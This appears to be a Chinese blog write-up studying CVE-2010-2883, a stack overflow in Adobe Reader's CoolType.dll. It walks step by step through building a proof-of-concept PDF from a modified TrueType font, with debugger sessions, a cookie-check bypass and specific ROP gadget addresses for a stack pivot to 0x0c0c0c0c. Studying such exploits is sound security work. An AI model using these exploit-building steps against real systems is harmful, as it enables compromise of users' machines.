
4. [CVE-2010-2883分析](#)

# 7. 续：如何自己构造poc文件

## 7.1 基本的修改

1. 选择原始合法TTF文件`Vera.ttf`，将name表名称修改为`SING`（注意大写）表，其余不变，此时数据偏移位于`0x11C`，长度为`0x1DDF`

2. 使用`pattern_create.rb`生成字符串粘贴到`sing`表的数据部分

1. 因为会有四个字节替换返回地址，为了确保跳转到一个无法执行的位置，从而确定是哪四个字节覆盖了返回地址，因此我决定直接将生成的字符串作为16进制复制到文件中

2. 关于生成的长度：不能太长，否则进行`strcat`复制到栈中时，会直接写到不可写的范围，导致程序终止。经过调试判断，这里选择长度`0x2000`

```go
ruby .\pattern_create.rb -l 8192 -s ABCDEF,123456789,abcdef,123456789 > output.txt
```

3. 选择原文件中`uniquename`字段中前1000个字节，进行数据替换，并修改最后三个字节为`0x00`

3. 此时`tableVersionMajor`已经是`0`了，所以不用做修改

4. 然后使用新生成的ttf文件替换msf.pdf中的ttf文件，并根据软件的提示，修改header中的数据大小

5. 使用`windbg`附加`adobereader`，在`strcat`调用处设置断点，然后打开新生成的poc.pdf，建立一个快照

## 7.2 替换成可写内存的位置

继续执行，程序中断

```go
0:000> g
(e6c.638): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=f1a3e9bf ebx=0012e608 ecx=f1a3e9a3 edx=07018bfc esi=0012e608 edi=04a260f4
eip=07001400 esp=0012e44c ebp=0012e454 iopl=0 nv up ei ng nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210286
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Program Files\Adobe\Reader 9.0\Reader\BIB.dll -
BIB+0x1400:
07001400 f0ff08 lock dec dword ptr [eax] ds:0023:f1a3e9bf=????????
```

`eax`这里无法写入，看一下`eax`的来源：

```go
0:000> ub
BIB+0x13f1:
070013f1 c3 ret
070013f2 55 push ebp
070013f3 8bec mov ebp,esp
070013f5 51 push ecx
070013f6 51 push ecx
070013f7 8d411c lea eax,[ecx+1Ch]
070013fa 8945f8 mov dword ptr [ebp-8],eax
070013fd 8b45f8 mov eax,dword ptr [ebp-8]
```

来自`[ecx+1Ch]`，而`ecx`的值是`f1a3e9a3`。所以我们需要在生成的文本中找到`a3e9a3f1`，并把它替换成一个可写的地址。

通过`!address`命令查看内存，找一块可写的内存，我选择的是`0x23949228`。

## 7.3 流程劫持位置的确定

1. 替换后，重复上述步骤，会发现程序直接退出了。

调试发现，退出行为发生在`.text:0803DEE1 E8 A9 A2 00 00 call @__security_check_cookie@4 ;`处，所以猜测是覆盖的数据太多，导致`check_cookie`失败了，仔细检查这里的代码：

```go
0803ded9 8b8d04010000 mov ecx,dword ptr [ebp+104h] ss:0023:0012e5dc=c6a3c5a3
0803dedf 33cd xor ecx,ebp
0803dee1 e8a9a20000 call CoolType!CTInit+0x1aec (0804818f)
```

注意这里`ecx`和`ebp`做异或之后就是要检查的`cooki`值，而`ecx`的值来自`0012e5dc`，是`c6a3c5a3`。

所以需要在生成文本中找到`0xa3c5a3c6`，但是发现这个数值的位置甚至还在第6步的可写内存地址之前，因为已经有了上面的分析经验，所以知道现在的分析步骤肯定是存在问题的

> 如果没有之前的分析步骤，直接自己写的话，我应该会不断修改替换的数据长度，这中间肯定要耗费一定时间，但是最终找到正确方向是没什么问题的。

为了方便设置内存访问断点，还是使用`OD`调试，在程序到达上一步可写内存的指令后，设置`strcat`目标地址处的内存访问断点

第一次中断在`0x8001263`，这里获取的数值不影响程序的执行流程；

第三次中断在`0x801BA64`，程序尝试从`0012E71C`获取值`C4A6C3A6`。从`IDA`中看静态代码，这里数据的取址会直接影响该函数的返回值：

```cpp
int __cdecl sub_801BA57(int a1){
int result; // eax
for ( result = dword_823A728; result; result = *(result + 8) ){
if ( *(a1 + 4) == *(result + 4) )
break;
}
return result;
}
```

单步继续执行，函数返回的是0，回到`0x8016c3a`。由于返回值是0，下面的跳转指令生效。为了测试这个跳转对于此次漏洞利用有没有影响，重新设置`EIP`的值，让程序不跳转，拍摄个快照，然后`F9`继续执行，由于内存断点没有取消，会发现程序中断在了`check_cookie`之前，然后继续单步就失败了

也就是说无论这里跳不跳转，程序最终都会因为`check_cookie`失败，我们生成的长度肯定是太长了。

根据数据生成规律，`C4A6C3A6`这个值要靠后很多，在生成数据中搜索，并把它前面的三个字节设置为`0x00`。

2. 使用最新生成的`poc.pdf`进行调试测试，这次程序在`0x801BA64`所在函数返回了一个非0值，因此后续跳转指令没有实现。`F9`继续执行，会发现程序中断在了`0xe2a5e1a5`：

```cpp
0:000> g
(f44.dc0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718
eip=e2a5e1a5 esp=0012dd24 ebp=0012dd48 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210202
e2a5e1a5 ?? ???
```

观察调用栈信息：

```cpp
0:000> kb
ChildEBP RetAddr Args to Child
WARNING: Frame IP not in any known module. Following frames may be wrong.
0012dd20 0808b30a 0012e6d0 00000003 00000000 0xe2a5e1a5
0012dd48 0801bb43 0012e718 0012ddc8 0012dde4 CoolType!CTInit+0x44c67
0012dd68 08016c5b 01efe214 0012e718 0012ddc8 CoolType+0x1bb43
0012de14 7c911d45 7c911066 7c9101bb 0000254c CoolType+0x16c5b
0012ddf8 04352a98 0012ddf0 0012de38 003f0000 ntdll!RtlAllocateHeap+0x677
0012de14 7c911d45 7c911066 7c9101bb 0000254c 0x4352a98
0012e044 00000000 0230f1e0 0012e220 000001f4 ntdll!RtlAllocateHeap+0x677
```

找到了返回地址`0808b30a`：

```cpp
0:000> ub 0808b30a
CoolType!CTInit+0x44c56:
0808b2f9 32c0 xor al,al
0808b2fb e994020000 jmp CoolType!CTInit+0x44ef1 (0808b594)
0808b300 8d4dfc lea ecx,[ebp-4]
0808b303 51 push ecx
0808b304 53 push ebx
0808b305 6a03 push 3
0808b307 50 push eax
0808b308 ff10 call dword ptr [eax]
```

成功定位到了流程被劫持的位置。

## 7.4 跳板指令的确定

接下来需要在生成数据中搜索`0xa5e1a5e2`，并把它替换成跳板指令所在的地址，但是跳板指令是什么呢？

我们的目标是通过`pop retn`让`0x0C0C0C0C`成为栈顶，然后继续`ROP`的执行

需要看一下寄存器的值，上面已经贴出了：

```cpp
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718
eip=e2a5e1a5 esp=0012dd24 ebp=0012dd48 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210202
```

目前可控数据所处的地址范围是`0x12e4d8~0x12e71c`，

最理想的情况就是让`esp`加上一定的值（这里是`0x7B4~0x9F8`），到达可控数据范围，然后`pop esp`修改`esp`为`0x0c0c0c0c`，再加一个`retn`

`pop esp retn`指令很好找（寻找的范围是`Adobe Reader`中一个`DLL`文件的加载地址）：

```cpp
0:000> a
4a80b69b pop esp
pop esp
4a80b69c retn
retn
4a80b69d
0:000> s 06000000 L3000000 5c c3
0:000> uf 060280c7
AGM!AGMInitialize+0x1a4f3:
060280c7 5c pop esp
060280c8 c3 ret
```

但是想在前面再加上一个`add esp`指令就不好找了，这也是为什么`msf`的代码中使用的使用`add ebp + leave retn`的模式，先对`ebp`进行计算，然后通过`leave`指令将其移动到`esp`中。

如果是对`ebp`进行加法，可能的范围就是`0x790~0x9D4`，不知道`0x794`这个数值是不是实验出来的，按照四字节对齐，第二次就是实验出来：

```cpp
0:000> s 06000000 L3000000 81 c5 90 07 00 00 c9 c3
0:000> s 06000000 L3000000 81 c5 94 07 00 00 c9 c3
081586a5 81 c5 94 07 00 00 c9 c3-55 8b ec 83 ec 1c 53 56 ........U.....SV
0:000> uf 081586a5
CoolType!CTCleanup+0x9ddb:
081586a5 81c594070000 add ebp,794h
081586ab c9 leave
081586ac c3 ret
```

## 7.5 跳板指令位置的确定

第一个跳板指令是`add ebp + leave retn`，把它的地址`081586a5`放到`0xa5e1a5e2`的位置，然后还是上述步骤调试，发现已经可以正常跳转到`add ebp, 794h`了：

```cpp
0:000> g
Breakpoint 1 hit
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718
eip=0808b308 esp=0012dd28 ebp=0012dd48 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202
CoolType!CTInit+0x44c65:
0808b308 ff10 call dword ptr [eax] ds:0023:0012e6d0=081586a5
0:000> t
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718
eip=081586a5 esp=0012dd24 ebp=0012dd48 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202
CoolType!CTCleanup+0x9ddb:
081586a5 81c594070000 add ebp,794h
```

`ebp+0x794=0x12e4dc`，`leave`指令相当于`mov esp, ebp; pop ebp`，因此`leave`指令之后，`esp`的数值应该是`0x12e4dc+4=0x12e4e0`，此时再执行`retn`，就会在`0x12e4e0`处的数值移入`EIP`中。

在`Windbg`中查看：

```cpp
0:000> p
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718
eip=081586ac esp=0012e4e0 ebp=a4a1a3a1 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202
CoolType!CTCleanup+0x9de2:
081586ac c3 ret
0:000> dd esp l1
0012e4e0 a6a1a5a1
```

这里的数据是`a6a1a5a1`。因此在生成数据中搜索`0xa1a5a1a6`，并将其替换为指令`pop esp retn`的地址`060280c7`。

在执行`pop esp`之前，由于前面的`retn`指令，此时`esp`应该指向`0x12e4e4`，因此要把这里的数据修改成`0x0C0C0C0C`。

全部修改完毕后，还是按照之前的步骤，形成`poc.pdf`，然后用`Windbg`调试，最后到达了`0x0c0c0c0c`位置，按照`ROP`的流程继续往下执行：

```cpp
0:000> p
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718
eip=060280c7 esp=0012e4e4 ebp=a4a1a3a1 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202
AGM!AGMInitialize+0x1a4f3:
060280c7 5c pop esp
0:000> p
eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efe214 edi=0012e718
eip=060280c8 esp=0c0c0c0c ebp=a4a1a3a1 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200202
AGM!AGMInitialize+0x1a4f4:
060280c8 c3 ret
```

注意此时`esp`已经是`0x0c0c0c0c`了。

*相关文件可以在《漏洞战争》这本书的配套资料中获取*

# 1. 漏洞描述与思考

该漏洞是`Adobe Reader`和`Acrobat`中的`CoolType.dll`库在解析字体文件`SING`表中的`uniqueName`项时存在的栈溢出漏洞。

之前漏洞分析一直参考的`0day`这本书，这次开始看《漏洞战争》，（只针对这一个漏洞）发现里面对于一些细节并没有特别说明，导致我在分析的时候还是满头雾水，虽然按照书中的介绍也能够分析出来，但还是觉得各个步骤之间的逻辑关系不够明确。
